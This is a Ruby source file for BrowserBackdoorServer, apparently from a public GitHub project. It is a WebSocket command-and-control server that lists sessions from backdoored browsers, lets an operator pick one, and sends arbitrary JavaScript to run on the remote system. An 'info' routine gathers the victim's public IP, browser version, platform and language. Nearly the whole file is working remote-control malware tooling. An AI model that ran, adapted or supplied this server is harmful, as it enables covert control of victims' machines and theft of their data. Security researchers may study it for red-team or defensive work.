#!/usr/bin/env ruby
# BrowserBackdoorServer - https://github.com/IMcPwn/browser-backdoor

# BrowserBackdoorServer is a WebSocket server that listens for connections 
# from BrowserBackdoor and creates an command-line interface for 
# executing commands on the remote system(s).
# For more information visit: http://imcpwn.com

# MIT License

# Copyright (c) 2016 Carleton Stuberg

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

require 'em-websocket'
require 'yaml'

# TODO: Make all the variables besides $wsList non global.
$welcome_message = "
 ____                                  ____             _       _                  
|  _ \                                |  _ \           | |     | |                 
| |_) |_ __ _____      _____  ___ _ __| |_) | __ _  ___| | ____| | ___   ___  _ __ 
|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  _ < / _' |/ __| |/ / _' |/ _ \ / _ \| '__|
| |_) | | | (_) \ V  V /\__ \  __/ |  | |_) | (_| | (__|   < (_| | (_) | (_) | |   
|____/|_|  \___/ \_/\_/ |___/\___|_|  |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_| by IMcPwn
Visit http://imcpwn.com for more information.
"
$wsList = Array.new
$selected = -1
$CONFIG = YAML.load_file("config.yml")

def main()
    Thread.new{startEM()}
    puts $welcome_message
    print "Enter help for help."
    while true
        print "\n> "
        cmdIn = gets.chomp.split()
        case cmdIn[0]
        when "help"
            # TODO: Shorten this line
            puts "Commands: help -> this message\nexit -> quit the application and close all sessions\nsessions -> list active sessions\nuse -> select a session\ninfo -> get various info (ip, browser info) on selected session\nexec -> execute a command on selected session"
        when "exit"
            break
        when "sessions"
            if $wsList.length < 1 
                puts "No sessions"
                next
            end
            puts "ID: Connection"
            $wsList.each_with_index {|val, index|
                puts index.to_s + " : " + val.to_s
            }
        when "use"
            if cmdIn.length < 2
                puts "Invalid usage. Try help for help."
                next
            end
            selectIn = cmdIn[1].to_i
            if selectIn > $wsList.length - 1
                puts "Session does not exist."
                next
            end
            $selected = selectIn
            puts "Selected session is now " + $selected.to_s + "."
        when "info"
            if $selected == -1
                puts "No session selected. Try use first."
                next
            end
            # TODO: Improve method of getting IP address
            commands = ["var xhttp = new XMLHttpRequest();xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", false);xhttp.send();xhttp.responseText","navigator.appVersion;", "navigator.platform;", "navigator.language;"]
            commands.each {|cmd|
                sendCommand(cmd, $wsList[$selected])
            }
        when "exec"
            if $selected == -1
                puts "No session selected. Try use first."
                next
            end
            if cmdIn.length < 2
                while true
                    print "Enter the command to send. (exit when done)\nCMD-#{$selected}> "
                    cmdSend = gets.split.join(' ')
                    break if cmdSend == "exit"
                    next if cmdSend == ""
                    sendCommand(cmdSend, $wsList[$selected])
                end
            else
                # TODO: Support space
                sendCommand(cmdIn[1], $wsList[$selected])
            end
        end
    end
end

def sendCommand(cmd, ws)
  ws.send(cmd)
end

def startEM()
    EM.run {
        EM::WebSocket.run({
            # TODO: Validate configuration variables. e.x private key must exist if secure is enabled.
            :host => $CONFIG['host'],
            :port => $CONFIG['port'],
            :secure => $CONFIG['secure'],
            :tls_options => {
                        :private_key_file => $CONFIG['priv_key'],
                        :cert_chain_file => $CONFIG['cert_chain']
        }
        }) do |ws|
            $wsList.push(ws)
            ws.onopen { |handshake|
                puts "\n[*] WebSocket connection open " + handshake.to_s
            }
            ws.onclose {
                puts "\n[X] Connection closed"
                $wsList.delete(ws)
            }
            ws.onmessage { |msg|
                puts "\n[*] Response received: " + msg
            }
            ws.onerror { |e|
                puts "\n[X] Error " + e.message
                $wsList.delete(ws)
            }
        end
    }
end

main()
